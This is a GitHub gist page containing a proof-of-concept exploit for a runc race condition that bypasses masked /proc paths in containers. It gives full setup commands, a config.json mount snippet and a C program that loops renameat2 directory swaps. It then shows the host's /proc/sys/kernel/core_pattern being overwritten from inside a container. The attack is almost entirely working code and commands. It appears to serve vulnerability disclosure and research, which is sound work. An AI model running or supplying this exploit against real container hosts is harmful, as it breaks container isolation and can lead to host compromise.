
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@LiveOverflow](https://avatars.githubusercontent.com/u/12161158?s=64&v=4)](/LiveOverflow)

# [LiveOverflow](/LiveOverflow)/**[runc\_poc.md](/LiveOverflow/c937820b688922eb127fb760ce06dab9)** Secret

Last active
June 8, 2023 02:51

Show Gist options

* [Download ZIP](/LiveOverflow/c937820b688922eb127fb760ce06dab9/archive/976ba7d5f7e0b580974b39659ae44a456edfcf50.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9.js&quot;&gt;&lt;/script&gt;
* Save LiveOverflow/c937820b688922eb127fb760ce06dab9 to your computer and use it in GitHub Desktop.

[Code](/LiveOverflow/c937820b688922eb127fb760ce06dab9)
[Revisions
2](/LiveOverflow/c937820b688922eb127fb760ce06dab9/revisions)
[Stars
1](/LiveOverflow/c937820b688922eb127fb760ce06dab9/stargazers)
[Forks
1](/LiveOverflow/c937820b688922eb127fb760ce06dab9/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9.js&quot;&gt;&lt;/script&gt;

Save LiveOverflow/c937820b688922eb127fb760ce06dab9 to your computer and use it in GitHub Desktop.

[Download ZIP](/LiveOverflow/c937820b688922eb127fb760ce06dab9/archive/976ba7d5f7e0b580974b39659ae44a456edfcf50.zip)

 [Raw](/LiveOverflow/c937820b688922eb127fb760ce06dab9/raw/976ba7d5f7e0b580974b39659ae44a456edfcf50/runc_poc.md)

[**runc\_poc.md**](#file-runc_poc-md)

# race-condition to bypass masked paths

## prepare rootfs

Get an ubuntu image and make sure `gcc` is installed so we can compile the proof of concept exploit. We also create a symlink to a folder, which will be in a evil bind mount shared by two containers.

```
docker run  --name foobar -it ubuntu /bin/bash
root@baf2988230a1:/# apt update && apt install -y gcc
root@baf2988230a1:/# exit
docker export foobar > rootfs.tar
mkdir ./rootfs
tar -xf rootfs.tar -C ./rootfs
cd ./rootfs
rm -rf ./proc
ln -s ./poc/layer/fakeproc proc
cd ..

```

preparing a shared bind mount volume for `container-1` and `container-2`

```
mkdir -p /tmp/poc/layer/fakeproc
mkdir -p /tmp/poc/layer1/fakeproc

```
## container 1

```
mkdir container-1
cd container-1
cp -r ../rootfs ./rootfs
runc spec
vim config.json

```

add the following mounts at the start of the default mounts in `config.json`

```
{
    "destination": "/poc",
    "type": "bind",
    "source": "/tmp/poc/",
    "options": [
        "bind"
    ]
},
{
    "destination": "/tmp",
    "type": "tmpfs",
    "source": "tmpfs"
},

```

start the container

```
runc run container-1

```
## container 2

in a second terminal

```
mkdir container-2
cd container-2
cp -r ../rootfs ./rootfs
cp ../container-1/config.json .

```
## container 1

```
cat > /tmp/pwn.c<<EOF
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main() {
    int fd1, fd2;

    fd1 = open("/poc/layer1", O_DIRECTORY | O_RDONLY );
    fd2 = open("/poc/layer", O_DIRECTORY | O_RDONLY );
    printf("fd1: %d | fd2: %d\n", fd1, fd2);
    while(1) {
        syscall(SYS_renameat2, fd1, "/poc/layer1", fd2, "/poc/layer", RENAME_EXCHANGE);
    }
}
EOF

gcc /tmp/pwn.c -o /tmp/pwn
/tmp/pwn # execute the swap script

```
## container 2

Try to run the `container-2`

```
runc run container-2

```

If the following errors appear, ignore and try again:

1. `ERRO[0000] container_linux.go:346: starting container process caused "set process label: open /proc/self/task/1/attr/exec: no such file or directory"`
2. `ERRO[0000] container_linux.go:346: starting container process caused "process_linux.go:449: container init caused \"readonly path /proc/fs: no such file or directory\""`

If the container starts, check if some masked paths in proc are writeable. For example try to overwrite the `core_pattern` with `echo hax > /proc/sys/kernel/core_pattern`.

1. If you get a `Directory nonexistent` error, ignore and try to write again.
2. If you get a `Read-only file system` error, exit the container and try again.

If you don't see an error, you should have won the race

```
# echo hax > /proc/sys/kernel/core_pattern
# cat /proc/sys/kernel/core_pattern
hax

```

and then verify outside the container

```
[root@fedora-v30 container-2]# cat /proc/sys/kernel/core_pattern
hax

```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FLiveOverflow%2Fc937820b688922eb127fb760ce06dab9)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

